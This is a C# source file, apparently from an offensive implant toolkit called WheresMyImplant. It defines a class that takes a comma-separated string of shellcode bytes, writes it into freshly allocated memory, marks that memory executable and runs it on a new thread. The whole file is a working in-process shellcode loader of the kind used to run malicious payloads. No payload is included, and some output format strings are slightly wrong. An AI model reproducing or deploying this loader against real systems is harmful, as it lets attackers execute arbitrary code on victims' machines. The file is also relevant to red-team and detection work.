using System;
using System.Runtime.InteropServices;
using System.Text;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    internal class InjectShellCode : Base, IDisposable
    {
        private const Char DELIMITER = ',';

        private IntPtr hThread;
        private String shellCodeString;

        ////////////////////////////////////////////////////////////////////////////////
        // https://github.com/subTee/EvilWMIProvider/blob/master/EvilWMIProvider/EvilWMIProvider.cs
        ////////////////////////////////////////////////////////////////////////////////
        internal InjectShellCode(String shellCodeString)
        {
            this.shellCodeString = shellCodeString;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            String[] shellCodeArray = shellCodeString.Split(DELIMITER);
            Byte[] shellCodeBytes = new Byte[shellCodeArray.Length];
            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                shellCodeBytes[i] = Convert.ToByte(value);
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                WriteOutputBad("Unable to allocate memory");
                return;
            }
            WriteOutput(String.Format("Allocated {0} bytes at 0x{0}", dwSize, lpBaseAddress.ToString("X4")));
            WriteOutput("Memory Protection Set to PAGE_READWRITE");

            ////////////////////////////////////////////////////////////////////////////////
            Marshal.Copy(shellCodeBytes, 0, lpBaseAddress, shellCodeBytes.Length);
            WriteOutput(String.Format("Injected ShellCode at address 0x{0}", lpBaseAddress.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            Winnt.MEMORY_PROTECTION_CONSTANTS lpflOldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
            if (!kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref lpflOldProtect))
            {
                WriteOutputBad("VirtualProtectEx Failed");
                return;
            }
            WriteOutput("Altering Memory Protections to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutput("Attempting to start thread");
            hThread = kernel32.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
            if (IntPtr.Zero == hThread)
            {
                WriteOutputBad("CreateRemoteThread Failed");
                return;
            }
            WriteOutput(String.Format("Started Thread: ", hThread.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        ~InjectShellCode()
        {
            Dispose();
        }

        ///////////////////////////////////////////////////////////////////////////////
        //
        ///////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }
        }

    }
}